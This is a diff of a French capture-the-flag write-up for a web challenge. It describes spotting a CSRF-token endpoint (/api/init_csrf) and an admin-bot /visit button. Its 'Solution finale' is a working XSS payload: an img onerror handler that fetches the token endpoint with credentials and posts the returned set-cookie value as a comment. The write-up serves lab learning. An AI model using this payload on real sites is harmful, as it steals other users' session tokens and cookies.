@@ -52,10 +52,20 @@ Bon essayons de voir s'il n'y as pas un endpoint qui peut-être intéressant. Ca
 
 Essayons de trouver un endpoint qui peut nous aider et essayons de voir un peu les différents code sources qui sont à notre disposition sur le site : 
 
+![](../img/Pasted%20image%2020260517145540.png)
+
+Tiens tiens tiens, un script est importé mais aussi une fonction est utiliser setTokenAcquired.  
+![](../img/Pasted%20image%2020260517145741.png)
+
+
+On peut voir qu'on nous donne un token de type csrf qui ce situe dans le /api/init_csrf. On peut donc pensez qu'il faudra récupérer les informations du bot admin lorsqu'il va chercher sont token csrf et donc le récupérer. 
+
+On peut voir aussi qu'il y a une fonction qui est notre fameux boutons pour notifier l'administrateur qui se situe au /visit. 
+
+
 
 
 Solution finale : 
-
 
 ```javascript
 <img src=x onerror="fetch('/api/init_csrf',{credentials:'include'}).then(r=>{var sc=r.headers.get('set-cookie');fetch('/post_comment',{method:'POST',credentials:'include',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'comment=SC='+encodeURIComponent(sc)})})">
